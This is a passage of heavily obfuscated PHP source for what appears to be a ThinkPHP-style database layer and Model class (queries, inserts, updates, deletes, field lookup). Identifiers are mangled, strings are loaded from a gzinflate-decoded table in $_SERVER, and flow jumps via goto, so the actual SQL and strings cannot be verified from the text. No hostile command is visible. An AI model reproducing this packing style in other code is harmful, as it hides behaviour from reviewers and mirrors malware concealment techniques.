(!$ÃÅÁçÉ¥) { $this->error(); return !1; } } return !0; } private function getAll() { $‹±·°Ñ£ = array(); if ($this->numRows > 0) { for ($ŠÛ­‡‘Ó = 0; $ŠÛ­‡‘Ó < $this->numRows; $ŠÛ­‡‘Ó++) { $‹±·°Ñ£[$ŠÛ­‡‘Ó] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $‹±·°Ñ£; } public function getFields($åÕÆôˆ) { $·ƒŞŞ¡ =& $_SERVER[—ÌÒğš÷]; $¥ˆÜŠ÷Ö = $this->query($·ƒŞŞ¡[941] . $this->parseKey($åÕÆôˆ)); $ôãˆõÁŞ = array(); if ($¥ˆÜŠ÷Ö) { foreach ($¥ˆÜŠ÷Ö as $ªÅ¢Ìš => $îúÖŠÂ) { $ôãˆõÁŞ[$îúÖŠÂ[$·ƒŞŞ¡[31]]] = array($·ƒŞŞ¡[32] => $îúÖŠÂ[$·ƒŞŞ¡[31]], $·ƒŞŞ¡[33] => $îúÖŠÂ[$·ƒŞŞ¡[34]], $·ƒŞŞ¡[35] => (bool) ($îúÖŠÂ[$·ƒŞŞ¡[36]] === $·ƒŞŞ¡[12]), $·ƒŞŞ¡[37] => $îúÖŠÂ[$·ƒŞŞ¡[38]], $·ƒŞŞ¡[39] => strtolower($îúÖŠÂ[$·ƒŞŞ¡[40]]) == $·ƒŞŞ¡[41], $·ƒŞŞ¡[42] => strtolower($îúÖŠÂ[$·ƒŞŞ¡[43]]) == $·ƒŞŞ¡[44]); } } return $ôãˆõÁŞ; } public function getTables($È×—ÚÎ = '') { $ºüà¾à =& $_SERVER[—ÌÒğš÷]; $¾¿ÄÂĞ = !empty($È×—ÚÎ) ? $ºüà¾à[943] . $È×—ÚÎ . $ºüà¾à[944] : $ºüà¾à[945]; $—î€ö‘Ä = $this->query($¾¿ÄÂĞ); $ªÁÚ—€ = array(); if ($—î€ö‘Ä) { foreach ($—î€ö‘Ä as $©µ›òà => $ñÓ¾ÂªÍ) { $ªÁÚ—€[$©µ›òà] = current($ñÓ¾ÂªÍ); } } return $ªÁÚ—€; } public function replace($²¡®í“, $Ø•¡â‚¸ = array()) { $ÍŞ˜¹‡İ =& $_SERVER[—ÌÒğš÷]; foreach ($²¡®í“ as $·ò›©÷ => $¢‰·š”Õ) { $òÛ¸İşÃ = $this->parseValue($¢‰·š”Õ); if (is_scalar($òÛ¸İşÃ)) { $¯ü‹É¾¤[] = $òÛ¸İşÃ; $ìÏüµŠŸ[] = $this->parseKey($·ò›©÷); } } $¡Ñ•ËŠŠ = $ÍŞ˜¹‡İ[946] . $this->parseTable($Ø•¡â‚¸[$ÍŞ˜¹‡İ[323]]) . $ÍŞ˜¹‡İ[947] . implode($ÍŞ˜¹‡İ[50], $ìÏüµŠŸ) . $ÍŞ˜¹‡İ[948] . implode($ÍŞ˜¹‡İ[50], $¯ü‹É¾¤) . $ÍŞ˜¹‡İ[949]; return $this->execute($¡Ñ•ËŠŠ); } public function insertAll($¢ã©ÊÙ, $¸Œñ·°‚ = array(), $ÏàÅúÑ = false) { $Ãñ‡É°€ =& $_SERVER[—ÌÒğš÷]; if (!is_array($¢ã©ÊÙ[0])) { return !1; } $ÚƒµŠ¨ò = array_keys($¢ã©ÊÙ[0]); $…Ñê€– = array(); foreach ($¢ã©ÊÙ as $‚¢ËãŒü) { $ç¤¢–ñÏ = array(); foreach ($‚¢ËãŒü as $…ß«¦”ú => $’÷Ìæ¿) { $’÷Ìæ¿ = $this->parseValue($’÷Ìæ¿); if (is_scalar($’÷Ìæ¿)) { $ç¤¢–ñÏ[] = $’÷Ìæ¿; } } $…Ñê€–[] = $Ãñ‡É°€[304] . implode($Ãñ‡É°€[50], $ç¤¢–ñÏ) . $Ãñ‡É°€[949]; } array_walk($ÚƒµŠ¨ò, array($this, $Ãñ‡É°€[950])); $‚–Œª  = $ÏàÅúÑ ? $Ãñ‡É°€[951] : $Ãñ‡É°€[952]; $½Ë´ŠüÁ = $‚–Œª  . $Ãñ‡É°€[953] . $this->parseTable($¸Œñ·°‚[$Ãñ‡É°€[323]]) . $Ãñ‡É°€[947] . implode($Ãñ‡É°€[50], $ÚƒµŠ¨ò) . $Ãñ‡É°€[954] . implode($Ãñ‡É°€[50], $…Ñê€–); return $this->execute($½Ë´ŠüÁ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $±ÑÀù× =& $_SERVER[—ÌÒğš÷]; $this->error = $this->_linkID->errno . $±ÑÀù×[4] . $this->_linkID->error; if ($±ÑÀù×[12] != $this->queryStr) { $this->error .= LNG($±ÑÀù×[48]) . $this->queryStr; } think_trace($this->error, $±ÑÀù×[12], $±ÑÀù×[49]); return $this->error; } public function escapeString($ÂÌíÖ€…) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ÂÌíÖ€…); } else { return addslashes($ÂÌíÖ€…); } } public function parseKey(&$×Ñ¿¶ÜÍ, $¥äÊëÊñ = true) { $Éšªªûö =& $_SERVER[—ÌÒğš÷]; if ($¥äÊëÊñ) { $×Ñ¿¶ÜÍ = $this->parseKeyCheck($×Ñ¿¶ÜÍ); } if ($×Ñ¿¶ÜÍ != $Éšªªûö[203] && !preg_match($Éšªªûö[955], $×Ñ¿¶ÜÍ)) { $×Ñ¿¶ÜÍ = $Éšªªûö[429] . trim($×Ñ¿¶ÜÍ, $Éšªªûö[429]) . $Éšªªûö[429]; } return $×Ñ¿¶ÜÍ; } } goto DŠå†‹õ»; A¼‡–ƒš»½: $_SERVER[Ş®ª¹ÕŸ] = explode($_SERVER[—ÌÒğš÷][649], gzinflate(substr($_SERVER[—ÌÒğš÷][650], 10, -8))); $tdcofjbvun = $_SERVER[—ÌÒğš÷][651]; while (strlen($tdcofjbvun) < $_SERVER[—ÌÒğš÷][652]) { if (!$tdcofjbvun) { break; } $tdcofjbvun++; } goto e®—´©©¤ì; AÔ°·äø¿‰: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\x6c\145", "\157\162\144\145\162", "\141\154\151\x61\163", "\x68\x61\166\x69\156\147", "\x67\x72\157\165\x70", "\x6c\x6f\143\x6b", "\144\x69\163\x74\x69\156\x63\x74", "\x61\x75\164\x6f", "\146\151\154\x74\x65\162", "\166\x61\x6c\151\144\141\164\145", "\162\145\x73\165\x6c\x74", "\142\151\x6e\144", "\x74\157\x6b\145\156"); public function __construct($±ÒÆî±« = '', $¹±‘‰Ğ¼ = '', $íŒ˜õæ“ = '') { $¹òôß’Œ =& $_SERVER[—ÌÒğš÷]; $this->_initialize(); if (!empty($±ÒÆî±«)) { if (strpos($±ÒÆî±«, $¹òôß’Œ[10])) { list($this->dbName, $this->name) = explode($¹òôß’Œ[10], $±ÒÆî±«); } else { $this->name = $±ÒÆî±«; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($¹±‘‰Ğ¼)) { $this->tablePrefix = $¹òôß’Œ[12]; } elseif ($¹òôß’Œ[12] != $¹±‘‰Ğ¼) { $this->tablePrefix = $¹±‘‰Ğ¼; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($¹òôß’Œ[288]); } $this->db(0, empty($this->connection) ? $íŒ˜õæ“ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ö¨¡ˆ³… =& $_SERVER[—ÌÒğš÷]; if (empty($this->fields)) { if (think_config($ö¨¡ˆ³…[289])) { $úÊ•êıè = $this->dbName ? $this->dbName : think_config($ö¨¡ˆ³…[290]); $æ²œ¬ = think_var_cache($ö¨¡ˆ³…[291] . strtolower(get_path_this($úÊ•êıè) . $ö¨¡ˆ³…[10] . $this->name)); if ($æ²œ¬) { $Í»Ë‰­ = think_config($ö¨¡ˆ³…[292]); if (empty($Í»Ë‰­) || $æ²œ¬[$ö¨¡ˆ³…[293]] == $Í»Ë‰­) { $this->fields = $æ²œ¬; return; } } } $this->flush(); } } public function flush() { $Š ÄÊâÕ =& $_SERVER[—ÌÒğš÷]; $this->db->setModel($this->name); $ÑºÏñÈé = $this->db->getFields($this->getTableName()); if (!$ÑºÏñÈé) { return !1; } $this->fields = array_keys($ÑºÏñÈé); $this->fields[$Š ÄÊâÕ[294]] = !1; foreach ($ÑºÏñÈé as $òçíö†ı => $Êş†è) { $¸õ˜Ùè¶[$òçíö†ı] = $Êş†è[$Š ÄÊâÕ[33]]; if ($Êş†è[$Š ÄÊâÕ[39]]) { $this->fields[$Š ÄÊâÕ[295]] = $òçíö†ı; if ($Êş†è[$Š ÄÊâÕ[42]]) { $this->fields[$Š ÄÊâÕ[294]] = !0; } } } $this->fields[$Š ÄÊâÕ[296]] = $¸õ˜Ùè¶; if (think_config($Š ÄÊâÕ[292])) { $this->fields[$Š ÄÊâÕ[293]] = think_config($Š ÄÊâÕ[292]); } if (think_config($Š ÄÊâÕ[289])) { $Şõ÷È– = $this->dbName ? $this->dbName : think_config($Š ÄÊâÕ[290]); think_var_cache($Š ÄÊâÕ[291] . strtolower(get_path_this($Şõ÷È–) . $Š ÄÊâÕ[10] . $this->name), $this->fields); } } public function switchModel($ºÏ•¬³ú, $ÓÂß¦ë¢ = array()) { $¹å…şëœ =& $_SERVER[—ÌÒğš÷]; $‡Ø–·®¾ = ucwords(strtolower($ºÏ•¬³ú)) . $¹å…şëœ[297]; if (!class_exists($‡Ø–·®¾)) { think_exception($‡Ø–·®¾ . think_lang($¹å…şëœ[298])); } $this->_extModel = new $‡Ø–·®¾($this->name); if (!empty($ÓÂß¦ë¢)) { foreach ($ÓÂß¦ë¢ as $Ç“µó ) { $this->_extModel->setProperty($Ç“µó , $this->{$Ç“µó }); } } return $this->_extModel; } public function __set($ÈßĞ‘Á², $×Ãİô˜) { $this->data[$ÈßĞ‘Á²] = $×Ãİô˜; } public function __get($–öÇíıÓ) { return isset($this->data[$–öÇíıÓ]) ? $this->data[$–öÇíıÓ] : null; } public function __isset($÷™ì­ïÂ) { return isset($this->data[$÷™ì­ïÂ]); } public function __unset($ö²­ª¿ò) { unset($this->data[$ö²­ª¿ò]); } public function __call($¦àğïæ, $åÄ”¨Æ) { $Ú…øÓºÄ =& $_SERVER[—ÌÒğš÷]; if (in_array(strtolower($¦àğïæ), $this->methods, !0)) { $this->options[strtolower($¦àğïæ)] = $åÄ”¨Æ[0]; return $this; } elseif (in_array(strtolower($¦àğïæ), array($Ú…øÓºÄ[299], $Ú…øÓºÄ[300], $Ú…øÓºÄ[301], $Ú…øÓºÄ[302], $Ú…øÓºÄ[303]), !0)) { $š†˜å† = isset($åÄ”¨Æ[0]) ? $åÄ”¨Æ[0] : $Ú…øÓºÄ[203]; $š†˜å† = $this->db->parseKey($š†˜å†); return $this->getField(strtoupper($¦àğïæ) . $Ú…øÓºÄ[304] . $š†˜å† . $Ú…øÓºÄ[305] . $¦àğïæ, $Ú…øÓºÄ[299]); } elseif (strtolower(substr($¦àğïæ, 0, 5)) == $Ú…øÓºÄ[306]) { $š†˜å† = think_parse_name(substr($¦àğïæ, 5)); $¶İ¹†Ù¬[$š†˜å†] = $åÄ”¨Æ[0]; return $this->where($¶İ¹†Ù¬)->find(); } elseif (strtolower(substr($¦àğïæ, 0, 10)) == $Ú…øÓºÄ[307]) { $¥°¥ˆ² = think_parse_name(substr($¦àğïæ, 10)); $¶İ¹†Ù¬[$¥°¥ˆ²] = $åÄ”¨Æ[0]; return $this->where($¶İ¹†Ù¬)->getField($åÄ”¨Æ[1]); } elseif (isset($this->_scope[$¦àğïæ])) { return $this->scope($¦àğïæ, $åÄ”¨Æ[0]); } elseif (method_exists($this, $¦àğïæ)) { array_unshift($åÄ”¨Æ, $¦àğïæ); return call_user_func_array(array($this, $Ú…øÓºÄ[308]), $åÄ”¨Æ); } else { return call_user_func_array(array(parent, $¦àğïæ), $åÄ”¨Æ); } } protected function call() { $“£·°ô =& $_SERVER[—ÌÒğš÷]; $„´ÜŞ˜¥ = func_get_args(); $€·–ËŒ = array_shift($„´ÜŞ˜¥); $äÎ¢àş = $€·–ËŒ; if (is_array($€·–ËŒ)) { $äÎ¢àş = $€·–ËŒ[1]; $€·–ËŒ = $€·–ËŒ[0]; } $Ï±™¿ûğ = count($„´ÜŞ˜¥) - 1; if (isset($„´ÜŞ˜¥[$Ï±™¿ûğ]) && $„´ÜŞ˜¥[$Ï±™¿ûğ] === $€·–ËŒ) { think_exception(__CLASS__ . $“£·°ô[4] . $€·–ËŒ . think_lang($“£·°ô[309])); return; } $„´ÜŞ˜¥[] = $€·–ËŒ; if (method_exists($this, $“£·°ô[310])) { $»Øà³„å = call_user_func_array(array($this, $“£·°ô[311]), array($äÎ¢àş, $„´ÜŞ˜¥)); if (!is_null($»Øà³„å) && $»Øà³„å !== !1) { return $»Øà³„å; } } $‰Áæ¼ªã = call_user_func_array(array($this, $€·–ËŒ), $„´ÜŞ˜¥); if (method_exists($this, $“£·°ô[312])) { $»Øà³„å = call_user_func_array(array($this, $“£·°ô[313]), array($äÎ¢àş, $„´ÜŞ˜¥, $‰Áæ¼ªã)); if ($»Øà³„å) { return $»Øà³„å; } } return $‰Áæ¼ªã; } protected function _initialize() { } protected function _facade($…£›—êë) { $†³æÑ  =& $_SERVER[—ÌÒğš÷]; if (!empty($this->fields)) { foreach ($…£›—êë as $”Šˆ“îÓ => $²¿€Ìóï) { if (is_array($this->fields) && !in_array($”Šˆ“îÓ, $this->fields, !0)) { unset($…£›—êë[$”Šˆ“îÓ]); } elseif (is_scalar($²¿€Ìóï)) { $this->_parseType($…£›—êë, $”Šˆ“îÓ); } } } if (!empty($this->options[$†³æÑ [314]])) { $…£›—êë = array_map($this->options[$†³æÑ [314]], $…£›—êë); unset($this->options[$†³æÑ [314]]); } $this->_beforeWrite($…£›—êë); return $…£›—êë; } protected function _beforeWrite(&$°ù²ñ’î) { } public function add($‚ÌŠ™´ä = '', $È‚ç«ì‰ = array(), $ğ™’¿ü» = false) { if (empty($‚ÌŠ™´ä)) { if (!empty($this->data)) { $‚ÌŠ™´ä = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[—ÌÒğš÷][315]); return !1; } } $È‚ç«ì‰ = $this->_parseOptions($È‚ç«ì‰); $‚ÌŠ™´ä = $this->_facade($‚ÌŠ™´ä); if (!1 === $this->_beforeInsert($‚ÌŠ™´ä, $È‚ç«ì‰)) { return !1; } $Ø×‰ğ€Ğ = $this->db->insert($‚ÌŠ™´ä, $È‚ç«ì‰, $ğ™’¿ü»); if (!1 !== $Ø×‰ğ€Ğ) { $ú¸óÙÛÑ = $this->getLastInsID(); if ($ú¸óÙÛÑ) { $‚ÌŠ™´ä[$this->getPk()] = $ú¸óÙÛÑ; $this->_after_insert($‚ÌŠ™´ä, $È‚ç«ì‰); return $ú¸óÙÛÑ; } $this->_after_insert($‚ÌŠ™´ä, $È‚ç«ì‰); } return $Ø×‰ğ€Ğ; } protected function _beforeInsert(&$¸‰©Â÷, $ÄÓõ»îû) { } protected function _after_insert($ˆ•¢Çì, $üÃşàĞÀ) { } public function addAll($¹Ú‘‡™å, $Í¯³ë†‰ = array(), $à¶è¦´¶ = false) { $»Õ¦ŸÏÖ =& $_SERVER[—ÌÒğš÷]; if (empty($¹Ú‘‡™å)) { $this->error = think_lang($»Õ¦ŸÏÖ[315]); return !1; } $Í¯³ë†‰ = $this->_parseOptions($Í¯³ë†‰); foreach ($¹Ú‘‡™å as $Ğ›ƒ™å => $§øÙÃ™) { $¹Ú‘‡™å[$Ğ›ƒ™å] = $this->_facade($§øÙÃ™); } if (method_exists($this->db, $»Õ¦ŸÏÖ[316])) { $ò™Ù¾óõ = $this->db->insertAll($¹Ú‘‡™å, $Í¯³ë†‰, $à¶è¦´¶); } else { $this->startTrans(); foreach ($¹Ú‘‡™å as $Ğ›ƒ™å => $§øÙÃ™) { $ò™Ù¾óõ = $this->db->insert($§øÙÃ™, $Í¯³ë†‰, $à¶è¦´¶); } $this->commit(); } if (!1 !== $ò™Ù¾óõ) { $¿Ù¡­«ö = $this->getLastInsID(); if ($¿Ù¡­«ö) { return $¿Ù¡­«ö; } } return $ò™Ù¾óõ; } public function selectAdd($‘œ„°Æ• = '', $Ûåœ ª… = '', $¤Óª¼¦ = array()) { $¡Ÿî¯õÈ =& $_SERVER[—ÌÒğš÷]; $¤Óª¼¦ = $this->_parseOptions($¤Óª¼¦); if (!1 === ($í¡àÂ± = $this->db->selectInsert($‘œ„°Æ• ? $‘œ„°Æ• : $¤Óª¼¦[$¡Ÿî¯õÈ[317]], $Ûåœ ª… ? $Ûåœ ª… : $this->getTableName(), $¤Óª¼¦))) { $this->error = think_lang($¡Ÿî¯õÈ[318]); return !1; } else { return $í¡àÂ±; } } public function save($üãö“„ = '', $¶—›×‚€ = array()) { $ÃíØ¬ôı =& $_SERVER[—ÌÒğš÷]; if (empty($üãö“„)) { if (!empty($this->data)) { $üãö“„ = $this->data; $this->data = array(); } else { $this->error = think_lang($ÃíØ¬ôı[315]); return !1; } } $üãö“„ = $this->_facade($üãö“„); $¶—›×‚€ = $this->_parseOptions($¶—›×‚€); $şï’¿ = $this->getPk(); if (!isset($¶—›×‚€[$ÃíØ¬ôı[319]])) { if (isset($üãö“„[$şï’¿])) { $®¬ˆ±Åä[$şï’¿] = $üãö“„[$şï’¿]; $¶—›×‚€[$ÃíØ¬ôı[319]] = $®¬ˆ±Åä; unset($üãö“„[$şï’¿]); } else { $this->error = think_lang($ÃíØ¬ôı[318]); return !1; } } if (is_array($¶—›×‚€[$ÃíØ¬ôı[319]]) && isset($¶—›×‚€[$ÃíØ¬ôı[319]][$şï’¿])) { $“Ëıá£ú = $¶—›×‚€[$ÃíØ¬ôı[319]][$şï’¿]; } if (!1 === $this->_beforeUpdate($üãö“„, $¶—›×‚€)) { return !1; } $½Í·ü‡µ = $this->db->update($üãö“„, $¶—›×‚€); if (!1 !== $½Í·ü‡µ) { if (isset($“Ëıá£ú)) { $üãö“„[$şï’¿] = $“Ëıá£ú; } $this->_afterUpdate($üãö“„, $¶—›×‚€); } return $½Í·ü‡µ; } protected function _beforeUpdate(&$‹ßüøÀ¼, $îâ¥‘) { } protected function _afterUpdate($ó¤›ßûã, $øÙ™îÜ) { } public function delete($îœˆ¤Öô = array()) { $ıüÑ•ã =& $_SERVER[—ÌÒğš÷]; if (empty($îœˆ¤Öô) && empty($this->options[$ıüÑ•ã[319]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Õ ”ö£å = $this->getPk(); if (is_numeric($îœˆ¤Öô) || is_string($îœˆ¤Öô)) { if (strpos($îœˆ¤Öô, $ıüÑ•ã[50])) { $ù§¬ˆñ[$Õ ”ö£å] = array($ıüÑ•ã[320], $îœˆ¤Öô); } else { $ù§¬ˆñ[$Õ ”ö£å] = $îœˆ¤Öô; } $this->options[$ıüÑ•ã[319]] = $ù§¬ˆñ; } $îœˆ¤Öô = $this->_parseOptions(); if (is_array($îœˆ¤Öô[$ıüÑ•ã[319]]) && isset($îœˆ¤Öô[$ıüÑ•ã[319]][$Õ ”ö£å])) { $‹úáƒïÑ = $îœˆ¤Öô[$ıüÑ•ã[319]][$Õ ”ö£å]; } $âšóÚ¨à = $this->db->delete($îœˆ¤Öô); if (!1 !== $âšóÚ¨à) { $óàß³¤º = array(); if (isset($‹úáƒïÑ)) { $óàß³¤º[$Õ ”ö£å] = $‹úáƒïÑ; } $this->_after_delete($óàß³¤º, $îœˆ¤Öô); } return $âšóÚ¨à; } protected function _after_delete($¿»ÍßÕ€, $µàşÌì–) { } public function select($Œì”ÜÂ = array()) { $¢ü¨Çø =& $_SERVER[—ÌÒğš÷]; if (is_string($Œì”ÜÂ) || is_numeric($Œì”ÜÂ)) { $´°Çš“€ = $this->getPk(); if (strpos($Œì”ÜÂ, $¢ü¨Çø[50])) { $šÆÆ€Ù›[$´°Çš“€] = array($¢ü¨Çø[320], $Œì”ÜÂ); } else { $šÆÆ€Ù›[$´°Çš“€] = $Œì”ÜÂ; } $this->options[$¢ü¨Çø[319]] = $šÆÆ€Ù›; } elseif (!1 === $Œì”ÜÂ) { $Œì”ÜÂ = $this->_parseOptions(); return $¢ü¨Çø[321] . $this->db->buildSelectSql($Œì”ÜÂ) . $¢ü¨Çø[322]; } $Œì”ÜÂ = $this->_parseOptions(); $èÜƒ¶¥ì = $this->db->select($Œì”ÜÂ); if (!1 === $èÜƒ¶¥ì) { return !1; } if (empty($èÜƒ¶¥ì)) { return null; } $this->_afterSelect($èÜƒ¶¥ì, $Œì”ÜÂ); return $èÜƒ¶¥ì; } protected function _afterSelect(&$®¨¯ç—Ê, $¹şåİÄ) { } public function buildSql($‘ÂÌ³ıÆ = array()) { $Ñİ¢œÚÑ =& $_SERVER[—ÌÒğš÷]; $‘ÂÌ³ıÆ = $this->_parseOptions($‘ÂÌ³ıÆ); return $Ñİ¢œÚÑ[321] . $this->db->buildSelectSql($‘ÂÌ³ıÆ) . $Ñİ¢œÚÑ[322]; } public function optionsValue($êáşñÑ = null) { if (is_null($êáşñÑ)) { return $this->options; } elseif (is_array($êáşñÑ)) { $this->options = array_merge($this->options, $êáşñÑ); } } protected function _parseOptions($¿Ş¤´šÆ = array()) { $‘ÛÓÏÅ¤ =& $_SERVER[—ÌÒğš÷]; if (is_array($¿Ş¤´šÆ)) { $¿Ş¤´šÆ = array_merge($this->options, $¿Ş¤´šÆ); } $this->options = array(); if (!isset($¿Ş¤´šÆ[$‘ÛÓÏÅ¤[323]])) { $¿Ş¤´šÆ[$‘ÛÓÏÅ¤[323]] = $this->getTableName(); $Ûó»Ë±ƒ = $this->fields; } else { $Ûó»Ë±ƒ = $this->getDbFields(); } if (!empty($¿Ş¤´šÆ[$‘ÛÓÏÅ¤[324]])) { $¿Ş¤´šÆ[$‘ÛÓÏÅ¤[323]] .= $‘ÛÓÏÅ¤[53] . $¿Ş¤´šÆ[$‘ÛÓÏÅ¤[324]]; } $¿Ş¤´šÆ[$‘ÛÓÏÅ¤[325]] = $this->name; if (isset($¿Ş¤´šÆ[$‘ÛÓÏÅ¤[319]]) && is_array($¿Ş¤´šÆ[$‘ÛÓÏÅ¤[319]]) && !empty($Ûó»Ë±ƒ) && !isset($¿Ş¤´šÆ[$‘ÛÓÏÅ¤[326]]) && !isset($¿Ş¤´šÆ[$‘ÛÓÏÅ¤[323]])) { foreach ($¿Ş¤´šÆ[$‘ÛÓÏÅ¤[319]] as $·‚İÕ½Û => $¹½‘òÃ”) { $·‚İÕ½Û = trim($·‚İÕ½Û); if (in_array($·‚İÕ½Û, $Ûó»Ë±ƒ, !0)) { if (is_scalar($¹½‘òÃ”)) { $this->_parseType($¿Ş¤´šÆ[$‘ÛÓÏÅ¤[319]], $·‚İÕ½Û); } } elseif (!is_numeric($·‚İÕ½Û) && $‘ÛÓÏÅ¤[11] != substr($·‚İÕ½Û, 0, 1) && !1 === strpos($·‚İÕ½Û, $‘ÛÓÏÅ¤[10]) && !1 === strpos($·‚İÕ½Û, $‘ÛÓÏÅ¤[304]) && !1 === strpos($·‚İÕ½Û, $‘ÛÓÏÅ¤[327]) && !1 === strpos($·‚İÕ½Û, $‘ÛÓÏÅ¤[328])) { unset($¿Ş¤´šÆ[$‘ÛÓÏÅ¤[319]][$·‚İÕ½Û]); } } } $this->_options_filter($¿Ş¤´šÆ); return $¿Ş¤´šÆ; } protected function _options_filter(&$‡ºÓ÷ùÏ) { } protected function _parseType(&$³©ãçã‹, $ˆí‘Ù¿) { $ İ‰Á†Õ =& $_SERVER[—ÌÒğš÷]; if (empty($this->options[$ İ‰Á†Õ[329]][$ İ‰Á†Õ[4] . $ˆí‘Ù¿])) { $İ§‡ü“ = strtolower($this->fields[$ İ‰Á†Õ[296]][$ˆí‘Ù¿]); if (!1 !== strpos($İ§‡ü“, $ İ‰Á†Õ[330])) { } elseif (!1 === strpos($İ§‡ü“, $ İ‰Á†Õ[331]) && !1 !== strpos($İ§‡ü“, $ İ‰Á†Õ[332])) { $³©ãçã‹[$ˆí‘Ù¿] = intval($³©ãçã‹[$ˆí‘Ù¿]); } elseif (!1 !== strpos($İ§‡ü“, $ İ‰Á†Õ[333]) || !1 !== strpos($İ§‡ü“, $ İ‰Á†Õ[334])) { $³©ãçã‹[$ˆí‘Ù¿] = floatval($³©ãçã‹[$ˆí‘Ù¿]); } elseif (!1 !== strpos($İ§‡ü“, $ İ‰Á†Õ[335])) { $³©ãçã‹[$ˆí‘Ù¿] = (bool) $³©ãçã‹[$ˆí‘Ù¿]; } } } public function find($ÏËÜÆµ¯ = array()) { $şàÑÑ =& $_SERVER[—ÌÒğš÷]; if (is_numeric($ÏËÜÆµ¯) || is_string($ÏËÜÆµ¯)) { $‡á¸Ùé•[$this->getPk()] = intval($ÏËÜÆµ¯); $this->options[$şàÑÑ[319]] = $‡á¸Ùé•; } $this->options[$şàÑÑ[336]] = 1; $ÏËÜÆµ¯ = $this->_parseOptions(); $³—¼×úÏ = $this->db->select($ÏËÜÆµ¯); if (!1 === $³—¼×úÏ) { return !1; } if (empty($³—¼×úÏ)) { return null; } $this->data = $³—¼×úÏ[0]; $this->_afterFind($this->data, $ÏËÜÆµ¯); if (!empty($this->options[$şàÑÑ[337]])) { return $this->returnResult($this->data, $this->options[$şàÑÑ[337]]); } return $this->data; } protected function _afterFind(&$¿‰±«øœ, $ÕßÙ§Ë‰) { } protected function returnResult($–ø×Ôãç, $®£Æ‡ËÇ = '') { $âøíÉí‹ =& $_SERVER[—ÌÒğš÷]; if ($®£Æ‡ËÇ) { if (is_callable($®£Æ‡ËÇ)) { return call_user_func($®£Æ‡ËÇ, $–ø×Ôãç); } switch (strtolower($®£Æ‡ËÇ)) { case $âøíÉí‹[338]: return json_encode($–ø×Ôãç); case $âøíÉí‹[339]: return xml_encode($–ø×Ôãç); } } return $–ø×Ôãç; } public function parseFieldsMap($ôŞ½«óÌ, $ÚÅõÚ¿Ÿ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $æ›õÂİè => $œ–÷“éœ) { if ($ÚÅõÚ¿Ÿ == 1) { if (isset($ôŞ½«óÌ[$œ–÷“éœ])) { $ôŞ½«óÌ[$æ›õÂİè] = $ôŞ½«óÌ[$œ–÷“éœ]; unset($ôŞ½«óÌ[$œ–÷“éœ]); } } else { if (isset($ôŞ½«óÌ[$æ›õÂİè])) { $ôŞ½«óÌ[$œ–÷“éœ] = $ôŞ½«óÌ[$æ›õÂİè]; unset($ôŞ½«óÌ[$æ›õÂİè]); } } } } return $ôŞ½«óÌ; } public function setField($ÜòƒÂî½, $°•Öİ÷¨ = '') { if (is_array($ÜòƒÂî½)) { $äë³‹¢î = $ÜòƒÂî½; } else { $äë³‹¢î[$ÜòƒÂî½] = $°•Öİ÷¨; } return $this->save($äë³‹¢î); } public function setAdd($×çÂëƒİ, $ååºóü = 1) { $ú¶Ã‚È =& $_SERVER[—ÌÒğš÷]; $ÄêëÃ = $×çÂëƒİ . $ú¶Ã‚È[340] . $ååºóü; if ($ååºóü < 0) { $ÄêëÃ = $×çÂëƒİ . $ååºóü; } return $this->setField($×çÂëƒİ, array($ú¶Ã‚È[341], $ÄêëÃ)); } public function getField($¹ã©–ø¹, $€øŞ¹â¾ = null) { $±è˜´© =& $_SERVER[—ÌÒğš÷]; $½ê²½ñú[$±è˜´©[317]] = $¹ã©–ø¹; $½ê²½ñú = $this->_parseOptions($½ê²½ñú); $¹ã©–ø¹ = trim($¹ã©–ø¹); if (strpos($¹ã©–ø¹, $±è˜´©[50])) { if (!isset($½ê²½ñú[$±è˜´©[336]])) { $½ê²½ñú[$±è˜´©[336]] = is_numeric($€øŞ¹â¾) ? $€øŞ¹â¾ : $±è˜´©[12]; } $ØÅÛÙƒ = $this->db->select($½ê²½ñú); if (!empty($ØÅÛÙƒ)) { $­›Ã¤Æà = explode($±è˜´©[50], $¹ã©–ø¹); $¹ã©–ø¹ = array_keys($ØÅÛÙƒ[0]); $ø¥Ô„Ğî = array_shift($¹ã©–ø¹); $ä˜éõ…Ù = array_shift($¹ã©–ø¹); $Ğí§ŸÁ§ = array(); $å¶‚ˆİ = count($­›Ã¤Æà); foreach ($ØÅÛÙƒ as $åöâ§›) { $äñœÅí = $åöâ§›[$ø¥Ô„Ğî]; if (2 == $å¶‚ˆİ) { $Ğí§ŸÁ§[$äñœÅí] = $åöâ§›[$ä˜éõ…Ù]; } else { $Ğí§ŸÁ§[$äñœÅí] = is_string($€øŞ¹â¾) ? implode($€øŞ¹â¾, $åöâ§›) : $åöâ§›; } } return $Ğí§ŸÁ§; } } else { if (!0 !== $€øŞ¹â¾) { $½ê²½ñú[$±è˜´©[336]] = is_numeric($€øŞ¹â¾) ? $€øŞ¹â¾ : 1; } if ($€øŞ¹â¾ === $±è˜´©[299]) { unset($½ê²½ñú[$±è˜´©[336]]); } $åöâ§› = $this->db->select($½ê²½ñú); if (!empty($åöâ§›)) { if ($€øŞ¹â¾ === $±è˜´©[299]) { return reset($åöâ§›[0]); } if (!0 !== $€øŞ¹â¾ && 1 == $½ê²½ñú[$±è˜´©[336]]) { return reset($åöâ§›[0]); } foreach ($åöâ§› as $§µŒÙÍ‡) { $‘ÖÇÁâÕ[] = $§µŒÙÍ‡[$¹ã©–ø¹]; } return $‘ÖÇÁâÕ; } } return null; } public function create($ª¿®â¢µ = '', $öØûàíµ = '') { $Š¢çãé¬ =& 